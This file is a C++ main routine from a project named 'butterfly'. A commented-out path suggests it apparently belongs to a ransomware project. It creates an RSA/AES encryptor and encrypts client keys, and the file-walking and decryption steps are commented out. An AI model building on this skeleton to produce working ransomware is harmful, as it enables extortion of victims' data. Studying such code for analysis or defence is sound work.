
#include <memory>

#include "argumentParser.h"
#include "directoryIterator.h"
#include "crypto/encryptor.h"
#include "crypto/decryptor.h"

int main(int argc, char* argv[]) {

    // parse args with the argument parser
    std::unique_ptr<butterfly::ArgumentParser> argparse(new butterfly::ArgumentParser());
    butterfly::ArgumentParser::Arguments arg = argparse->parseArgs(argc, argv);

    LOG_INFO("Start application "<< PROJECT_NAME << " with version " << arg._version);
    //std::shared_ptr<butterfly::DirectoryIterator> dirIterator(new butterfly::DirectoryIterator());

    // start encryption
    std::unique_ptr<butterfly::Encryptor> encryptor(new butterfly::Encryptor(2048));
    encryptor->encryptCPrivateRSA();

    encryptor->encryptAESKey();


    /*
    sleep(2);

    std::unique_ptr<butterfly::Decryptor> decryptor(new butterfly::Decryptor());
    std::string cprivate = decryptor->decryptCPrivateRSA("/home/christian/projects/ransomware/masterkeys/SPrivateRSA.pem");
    decryptor->decryptAESKey(cprivate);
    */

    return 0;
}